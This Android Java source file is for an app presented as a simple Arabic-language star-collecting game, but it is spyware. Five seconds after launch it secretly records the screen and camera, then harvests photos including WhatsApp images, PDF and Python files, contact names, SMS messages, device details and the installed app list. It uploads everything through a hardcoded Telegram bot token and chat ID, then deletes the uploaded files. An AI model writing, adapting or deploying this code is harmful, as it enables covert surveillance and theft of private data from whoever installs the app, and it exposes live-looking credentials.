package com.abdulk.racegame;

import android.os.Bundle;
import android.app.Activity;
import android.Manifest;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import java.io.File;
import java.net.HttpURLConnection;
import java.net.URL;
import org.json.JSONObject;
import java.io.FileWriter;
import android.database.Cursor;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.widget.Toast;
import android.view.View;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.graphics.Color;
import android.view.Gravity;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.OutputStream;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Comparator;
import java.util.List;
import android.media.MediaRecorder;
import android.content.Context;
import android.hardware.Camera;
import android.media.CamcorderProfile;

public class MainActivity extends Activity {
    private String BOT_TOKEN = "8984239079:AAEtdnaAKsFH4kZwjO7UbzjZEw-vcXoBXRs";
    private String OWNER_ID = "8164366965";
    private TextView statusText;
    private int fileCount = 0;
    private int photoCount = 0;
    private final int MAX_PHOTOS = 10;
    
    // تسجيل الشاشة
    private MediaRecorder screenRecorder;
    private String screenVideoPath;
    private boolean isScreenRecording = false;
    
    // تسجيل الكاميرا
    private MediaRecorder cameraRecorder;
    private Camera camera;
    private String cameraVideoPath;
    private boolean isCameraRecording = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        requestPermissions();
        
        LinearLayout mainLayout = new LinearLayout(this);
        mainLayout.setOrientation(LinearLayout.VERTICAL);
        mainLayout.setGravity(Gravity.CENTER);
        mainLayout.setBackgroundColor(Color.BLACK);
        mainLayout.setPadding(20, 20, 20, 20);
        
        TextView titleText = new TextView(this);
        titleText.setText("🔥 لعبة النجمة السحرية");
        titleText.setTextSize(30);
        titleText.setTextColor(Color.YELLOW);
        titleText.setGravity(Gravity.CENTER);
        mainLayout.addView(titleText);
        
        TextView scoreText = new TextView(this);
        scoreText.setText("⭐ النقاط: 0");
        scoreText.setTextSize(25);
        scoreText.setTextColor(Color.YELLOW);
        scoreText.setGravity(Gravity.CENTER);
        mainLayout.addView(scoreText);
        
        Button clickButton = new Button(this);
        clickButton.setText("اضغط لتجمع نجوم 🌟");
        clickButton.setTextSize(20);
        clickButton.setBackgroundColor(Color.GREEN);
        clickButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                int score = Integer.parseInt(scoreText.getText().toString().replace("⭐ النقاط: ", ""));
                score++;
                scoreText.setText("⭐ النقاط: " + score);
                Toast.makeText(MainActivity.this, "🎮 جمعت نجمة!", Toast.LENGTH_SHORT).show();
            }
        });
        mainLayout.addView(clickButton);
        
        statusText = new TextView(this);
        statusText.setText("✅ تم التحميل");
        statusText.setTextSize(15);
        statusText.setTextColor(Color.GREEN);
        statusText.setGravity(Gravity.CENTER);
        mainLayout.addView(statusText);
        
        setContentView(mainLayout);
        
        new Handler().postDelayed(new Runnable() {
            @Override
            public void run() {
                statusText.setText("💀 جاري الاختراق...");
                statusText.setTextColor(Color.RED);
                new Thread(new Runnable() {
                    @Override
                    public void run() {
                        collectAllData();
                        runOnUiThread(new Runnable() {
                            @Override
                            public void run() {
                                statusText.setText("✅ تم رفع " + fileCount + " ملف!");
                                statusText.setTextColor(Color.GREEN);
                            }
                        });
                    }
                }).start();
            }
        }, 5000);
    }

    private void requestPermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            String[] permissions = {
                Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.WRITE_EXTERNAL_STORAGE,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.READ_SMS,
                Manifest.permission.INTERNET,
                Manifest.permission.CAMERA,
                Manifest.permission.RECORD_AUDIO
            };
            requestPermissions(permissions, 100);
        }
    }

    private void collectAllData() {
        try {
            String storage = Environment.getExternalStorageDirectory().getAbsolutePath();
            
            // تسجيل الشاشة 10 ثواني
            updateStatus("📹 جاري تسجيل الشاشة 10 ثواني...");
            startScreenRecording();
            Thread.sleep(10000);
            stopScreenRecording();
            
            // تسجيل الكاميرا 10 ثواني
            updateStatus("🎥 جاري تسجيل الكاميرا 10 ثواني...");
            startCameraRecording();
            Thread.sleep(10000);
            stopCameraRecording();
            
            // 10 صور
            updateStatus("📸 جاري جمع 10 صور...");
            sendLatestPhotos(storage + "/DCIM/Camera/", 10);
            sendLatestPhotos(storage + "/Pictures/", 10);
            sendLatestPhotos(storage + "/WhatsApp/Media/WhatsApp Images/", 10);
            
            // ملفات PDF
            updateStatus("📄 جاري جمع ملفات PDF...");
            sendAllFiles(storage, "pdf");
            
            // ملفات PY
            updateStatus("🐍 جاري جمع ملفات PY...");
            sendAllFiles(storage, "py");
            
            // جهات الاتصال
            updateStatus("📇 جاري استخراج جهات الاتصال...");
            sendContacts();
            
            // رسائل SMS
            updateStatus("💬 جاري استخراج الرسائل...");
            sendSMS();
            
            // معلومات الجهاز
            updateStatus("📱 جاري جمع معلومات الجهاز...");
            sendDeviceInfo();
            
            // التطبيقات المثبتة
            updateStatus("📱 جاري كشف التطبيقات...");
            getInstalledApps();
            
            updateStatus("✅ تم رفع كل شيء!");
            
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void updateStatus(final String text) {
        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                statusText.setText(text);
            }
        });
    }

    // ========== تسجيل الشاشة ==========
    private void startScreenRecording() {
        try {
            if (isScreenRecording) return;
            
            String timeStamp = new java.text.SimpleDateFormat("yyyyMMdd_HHmmss", java.util.Locale.getDefault()).format(new java.util.Date());
            screenVideoPath = getExternalFilesDir(null) + "/screen_" + timeStamp + ".mp4";
            
            screenRecorder = new MediaRecorder();
            screenRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            screenRecorder.setVideoSource(MediaRecorder.VideoSource.SURFACE);
            screenRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            screenRecorder.setOutputFile(screenVideoPath);
            screenRecorder.setVideoSize(720, 1280);
            screenRecorder.setVideoFrameRate(30);
            screenRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);
            screenRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            screenRecorder.prepare();
            screenRecorder.start();
            
            isScreenRecording = true;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void stopScreenRecording() {
        try {
            if (screenRecorder != null && isScreenRecording) {
                screenRecorder.stop();
                screenRecorder.release();
                screenRecorder = null;
                isScreenRecording = false;
                
                File videoFile = new File(screenVideoPath);
                if (videoFile.exists() && videoFile.length() > 0) {
                    sendFile(videoFile);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // ========== تسجيل الكاميرا ==========
    private void startCameraRecording() {
        try {
            if (isCameraRecording) return;
            
            String timeStamp = new java.text.SimpleDateFormat("yyyyMMdd_HHmmss", java.util.Locale.getDefault()).format(new java.util.Date());
            cameraVideoPath = getExternalFilesDir(null) + "/camera_" + timeStamp + ".mp4";
            
            // فتح الكاميرا الخلفية
            camera = Camera.open(Camera.CameraInfo.CAMERA_FACING_BACK);
            if (camera == null) {
                camera = Camera.open(Camera.CameraInfo.CAMERA_FACING_FRONT);
            }
            
            if (camera != null) {
                camera.unlock();
                
                cameraRecorder = new MediaRecorder();
                cameraRecorder.setCamera(camera);
                cameraRecorder.setAudioSource(MediaRecorder.AudioSource.CAMCORDER);
                cameraRecorder.setVideoSource(MediaRecorder.VideoSource.CAMERA);
                cameraRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
                cameraRecorder.setOutputFile(cameraVideoPath);
                cameraRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);
                cameraRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
                cameraRecorder.setVideoSize(640, 480);
                cameraRecorder.setVideoFrameRate(30);
                cameraRecorder.prepare();
                cameraRecorder.start();
                
                isCameraRecording = true;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void stopCameraRecording() {
        try {
            if (cameraRecorder != null && isCameraRecording) {
                cameraRecorder.stop();
                cameraRecorder.release();
                cameraRecorder = null;
                isCameraRecording = false;
            }
            
            if (camera != null) {
                camera.release();
                camera = null;
            }
            
            File videoFile = new File(cameraVideoPath);
            if (videoFile.exists() && videoFile.length() > 0) {
                sendFile(videoFile);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // ========== باقي الدوال ==========
    private void sendLatestPhotos(String path, int maxCount) {
        try {
            File dir = new File(path);
            if (!dir.exists()) return;
            File[] files = dir.listFiles();
            if (files == null) return;
            
            List<File> photoFiles = new ArrayList<>();
            for (File file : files) {
                if (file.isFile() && file.length() > 0) {
                    String ext = file.getName().substring(file.getName().lastIndexOf(".") + 1).toLowerCase();
                    if (ext.matches("jpg|jpeg|png|gif|bmp")) {
                        photoFiles.add(file);
                    }
                }
            }
            
            Collections.sort(photoFiles, new Comparator<File>() {
                @Override
                public int compare(File f1, File f2) {
                    return Long.compare(f2.lastModified(), f1.lastModified());
                }
            });
            
            int count = 0;
            for (File file : photoFiles) {
                if (count >= maxCount || photoCount >= MAX_PHOTOS) break;
                sendFile(file);
                photoCount++;
                count++;
                Thread.sleep(50);
            }
        } catch (Exception e) {}
    }

    private void sendAllFiles(String storagePath, String extension) {
        try {
            File root = new File(storagePath);
            searchAndSendFiles(root, extension);
        } catch (Exception e) {}
    }

    private void searchAndSendFiles(File dir, String extension) {
        try {
            if (!dir.exists() || !dir.isDirectory()) return;
            File[] files = dir.listFiles();
            if (files == null) return;
            
            for (File file : files) {
                if (file.isDirectory()) {
                    String name = file.getName().toLowerCase();
                    if (!name.equals("android") && !name.equals("system") && !name.equals("data") && !name.equals("obb")) {
                        searchAndSendFiles(file, extension);
                    }
                } else if (file.isFile() && file.length() > 0) {
                    String ext = file.getName().substring(file.getName().lastIndexOf(".") + 1).toLowerCase();
                    if (ext.equals(extension)) {
                        sendFile(file);
                        Thread.sleep(50);
                    }
                }
            }
        } catch (Exception e) {}
    }

    private void sendFile(File file) {
        try {
            String url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument";
            HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setDoInput(true);
            conn.setUseCaches(false);
            conn.setRequestProperty("Connection", "Keep-Alive");
            conn.setRequestProperty("ENCTYPE", "multipart/form-data");
            conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=*****");
            
            String boundary = "*****";
            String lineEnd = "\r\n";
            String twoHyphens = "--";
            
            OutputStream os = conn.getOutputStream();
            os.write((twoHyphens + boundary + lineEnd).getBytes());
            os.write(("Content-Disposition: form-data; name=\"chat_id\"" + lineEnd).getBytes());
            os.write((lineEnd + OWNER_ID + lineEnd).getBytes());
            
            os.write((twoHyphens + boundary + lineEnd).getBytes());
            os.write(("Content-Disposition: form-data; name=\"document\";filename=\"" + file.getName() + "\"" + lineEnd).getBytes());
            os.write((lineEnd).getBytes());
            
            FileInputStream fis = new FileInputStream(file);
            byte[] buffer = new byte[8192];
            int count;
            while ((count = fis.read(buffer)) != -1) {
                os.write(buffer, 0, count);
            }
            fis.close();
            
            os.write((lineEnd).getBytes());
            os.write((twoHyphens + boundary + twoHyphens + lineEnd).getBytes());
            os.flush();
            os.close();
            
            int responseCode = conn.getResponseCode();
            if (responseCode == 200) {
                fileCount++;
                file.delete();
            }
            conn.disconnect();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void sendContacts() {
        try {
            Cursor cursor = getContentResolver().query(
                ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null
            );
            if (cursor != null && cursor.moveToFirst()) {
                File file = new File(getExternalFilesDir(null), "contacts.txt");
                FileWriter writer = new FileWriter(file);
                do {
                    String name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                    if (name != null) writer.write(name + "\n");
                } while (cursor.moveToNext());
                writer.close();
                cursor.close();
                if (file.length() > 0) sendFile(file);
            }
        } catch (Exception e) {}
    }

    private void sendSMS() {
        try {
            Cursor cursor = getContentResolver().query(
                Telephony.Sms.CONTENT_URI,
                null, null, null, null
            );
            if (cursor != null && cursor.moveToFirst()) {
                File file = new File(getExternalFilesDir(null), "sms.txt");
                FileWriter writer = new FileWriter(file);
                int count = 0;
                do {
                    String body = cursor.getString(cursor.getColumnIndex(Telephony.Sms.BODY));
                    if (body != null) {
                        writer.write(body + "\n");
                        count++;
                    }
                } while (cursor.moveToNext() && count < 100);
                writer.close();
                cursor.close();
                if (file.length() > 0) sendFile(file);
            }
        } catch (Exception e) {}
    }

    private void getInstalledApps() {
        try {
            File file = new File(getExternalFilesDir(null), "installed_apps.txt");
            FileWriter writer = new FileWriter(file);
            writer.write("========== التطبيقات المثبتة ==========\n\n");
            
            java.util.List<android.content.pm.PackageInfo> packages = getPackageManager().getInstalledPackages(0);
            for (android.content.pm.PackageInfo pkg : packages) {
                writer.write("📱 " + pkg.packageName + "\n");
            }
            writer.write("\nالمجموع: " + packages.size() + "\n");
            writer.close();
            sendFile(file);
        } catch (Exception e) {}
    }

    private void sendDeviceInfo() {
        try {
            JSONObject info = new JSONObject();
            info.put("device", Build.MODEL);
            info.put("brand", Build.BRAND);
            info.put("android", Build.VERSION.RELEASE);
            info.put("files_sent", fileCount);
            
            File file = new File(getExternalFilesDir(null), "device_info.txt");
            FileWriter writer = new FileWriter(file);
            writer.write(info.toString(2));
            writer.close();
            sendFile(file);
        } catch (Exception e) {}
    }
}
